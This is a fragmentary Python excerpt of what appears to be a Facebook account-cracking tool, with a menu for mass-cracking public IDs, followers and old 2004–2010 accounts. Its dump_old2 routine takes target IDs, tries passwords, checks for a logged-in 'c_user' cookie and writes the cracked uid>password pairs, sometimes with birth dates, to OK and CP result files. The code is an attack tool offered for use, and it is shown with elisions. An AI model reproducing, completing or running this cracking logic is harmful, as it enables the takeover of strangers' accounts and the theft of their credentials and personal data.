...
def xoshnaw():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;91mID ACTIVATE (WhatsApp) Best Technical ")
...
def menu():
	...
	print(balmond+u+" =>"+h+" Best.Technical/OK_%s.txt"%(hck))



	print(balmond+u+" =>"+k+" Best.Technical/CP_%s.txt"%(hck))
	...
	print(s+"\n{"+m+"1"+s+"}"+B+" Crack ID Public  "+H+"{5000}")



	print(s+"{"+m+"2"+s+"}"+B+" Crack ID Followers Public "+H+"{5000}")



	print(s+"{"+m+"3"+s+"}"+B+" Crack Files Public "+s+"{"+m+"Massal"+s+"}")



	print(s+"{"+m+"4"+s+"}"+B+" Crack ID Old 2004/2008 "+s+"{"+m+"Massal"+s+"}")



	print(s+"{"+m+"5"+s+"}"+H+" Crack ID Old 2004/2010 "+s+"{"+m+"Massal"+s+"}")



	print(s+"{"+m+"6"+s+"}"+H+" Setting User Agent "+s+"{Open}")



	print(s+"{"+m+"7"+s+"}"+H+" Check CP ID Crack "+s+"{ok/cp}")
...
def result():
	...
	print(s+"\n{"+m+"1"+s+"}"+K+" Check Result CP "+k+"{akun sesi}")



	print(s+"{"+m+"2"+s+"}"+H+" Check Result OK "+k+"{akun terbuka}")
	...
	if pilih=="1" or pilih=="01":
		...
		try:
			...
			lisaa = os.listdir("Best.Technical_Cp")
		...
		if len(lisaa)==0:
			...
			print("\n"+balmond+k+" Best.Technical CP")



			print(balmond+m+" Best.Technical Cp")
			...
			try:
				...
				binatang = open("Best.Technical_CP/%s"%(marjan))
		...
		bilur = os.system("cd Best.Technical_Cp && cat %s"%(marjan))
		...
		try:
			...
			lisaa = os.listdir("Best.Technical_Ok")
		...
		if len(lisaa)==0:
			...
			print("\n"+balmond+l+" Best.Technical Ok")



			print(balmond+m+" Best.Technical Ok")
			...
			try:
				...
				binatang = open("Best.Technical_Ok/%s"%(marjan))
		...
		bilur = os.system("cd Best.Technical_Ok && cat %s"%(marjan))
...
def dump_old2():
        ...
        for dot in range(nada):
                ...
                uid = input(balmond+l+" ID Target %s : "%(dot))
				...
				if "jangan" in opsit:
					...
					try:
						...
						if "old" in old_gak:
							...
							bts = open("Best.Technical_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
		...
		try:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				if "old" in old_gak:
					...
					bts = open("Best.Technical_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					...
					try:
						...
						if len(lahir)==2:
							...
							if "old" in old_gak:
								...
								bts = open("Best.Technical_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
							...
							if "old" in old_gak:
								...
								bts = open("Best.Technical_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
...
def cek_opsi():
	...
	print(balmond+l+" Contoh : "+k+"Best.Technical_Cp/CP_%s.txt"%(hck))
